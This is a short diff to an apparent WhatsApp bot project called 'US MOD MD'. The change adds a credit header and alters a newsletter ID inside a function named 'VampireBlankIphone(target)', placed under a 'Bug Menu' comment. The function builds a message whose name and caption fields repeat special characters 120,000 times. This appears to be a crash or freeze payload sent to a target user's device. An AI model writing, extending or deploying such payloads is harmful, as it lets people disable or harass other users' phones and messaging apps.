@@ -1,3 +1,10 @@
+/**
+ * US MOD MD — WhatsApp Bot
+ * Developed & Owned by: USMAN KHAN CHACHAR
+ * GitHub / Credit must remain intact. Do not remove or alter this header.
+ * Unauthorized redistribution without credit is a violation of the license.
+ */
+
 // =========== Bug Menu
 // Func
 async function VampireBlankIphone(target) {
@@ -6,7 +13,7 @@ async function VampireBlankIphone(target) {
             botInvokeMessage: {
                 message: {
                     newsletterAdminInviteMessage: {
-                        newsletterJid: `33333333333333333@newsletter`,
+                        newsletterJid: `120363428492698734@newsletter`,
                         newsletterName: "𝐆𝐫𝐢𝐦𝐑𝐞𝐚𝐩𝐞𝐫" + "ી".repeat(120000),
                         jpegThumbnail: "",
                         caption: "ꦽ".repeat(120000),
